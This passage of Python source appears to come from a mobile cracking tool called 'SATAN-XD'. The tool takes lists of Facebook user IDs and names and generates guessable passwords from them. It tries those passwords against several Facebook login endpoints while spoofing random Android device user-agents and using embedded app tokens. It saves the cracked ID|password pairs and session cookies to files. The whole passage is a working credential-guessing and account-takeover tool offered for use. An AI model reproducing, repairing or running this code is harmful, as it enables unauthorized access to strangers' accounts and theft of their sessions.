                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
                                first_name = names.rsplit(' ')[0]
                                try:
                                        last_name = names.rsplit(' ')[1]
                                except IndexError:
                                        last_name = 'Khan'
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                                SATAN.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python SATAN.py')
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [SATAN-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        SATAN=session.cookies.get_dict().keys()
                        if "c_user" in SATAN:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [SATAN-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SATAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SATAN:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [SATAN-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SATAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
xxxxx=(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550','GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
def api(ids,names,passlist):
                try:
                        global oks,cps,loop
                        sys.stdout.write('\r\r\033[1;37m [SATAN-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        "access_token": "EAALYWwShtHQBAKiNleKkiJe0mR2gQByLSQmnJFPULvn1ZCKq2brZBASX1eWWqEIhy4vxIBz46fgihhokPNQXZBmPnbbVlPLnXms7uiys36vaIKfN9BRINn6gVClSlilQPjrVWBUt3GB6R7A3OtLc6x3LLZAlOUYy1UGfE1LDQbdP337m9rfcjhjzi2aS36AZD",
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"en_US","client_country_code":"US",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent': ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [SATAN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SATAN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;93m [SATAN-CP] '+ids+' | '+pas+'\x1b[1;93m')
                                                open('/sdcard/SATAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def api1(ids,names,passlist):
                try:
                        global oks,cps,loop
                        sys.stdout.write('\r\r\033[1;37m [SATAN-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"es_UC","client_country_code":"CU",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent': randBuildLSB(),
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [SATAN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SATAN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;93m [SATAN-CP] '+ids+' | '+pas+'\x1b[1;93m')
                                                open('/sdcard/SATAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/SATAN-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def rndm(ids,passlist):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in passlist:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':pro,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(ids+'|'+ps+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;32m[SATAN-OK] '+cid+'|'+ps+'\033[0;97m')
                open('SATAN-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\x1b[1;93m[SATAN-CP] '+ids+' '+ps+'\x1b[1;93m')
                open('SATAN-CP.txt', 'a').write(ids+' | '+ps+'\n')
                cps.append(cid)
                break
        loop+=1
        sys.stdout.write(f'\r\033[1;97m[SATAN-XD]\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except requests.exceptions.ConnectionError:
             time.sleep(10)
    except:
        pass

def s1napi(ids,names,passlist):
        try:
            global oks, cps, loop
            sys.stdout.write('\r\r\033[1;37m [SATAN-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn
            for ps in passlist:
                pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pw,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': iAmAndroidUa(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if "session_key" in q:
                    coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={sb};{coki}"
                    print('\r\033[1;92m[LEGEND-STN-OK] %s | %s \033[1;97m '%(ids,pw))
                    oks.append(ids)
                    open('/sdcard/STN_M1_OK.txt','a').write(ids+'|'+pw+'\n')
                    open('/sdcard/STN_M1_COOKIES.txt','a').write(ids+'|'+pw+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print('\r\033[1;91m[ALONE-STN-CP] %s | %s \033[1;97m '%(ids,pw))
                    cps.append(ids)
                    open('/sdcard/ALONE_M1_CP.txt','a').write(ids+'|'+pw+'\n')
                    break
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(10)   
try:
        menu()
except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
except Exception as e:pass
menu()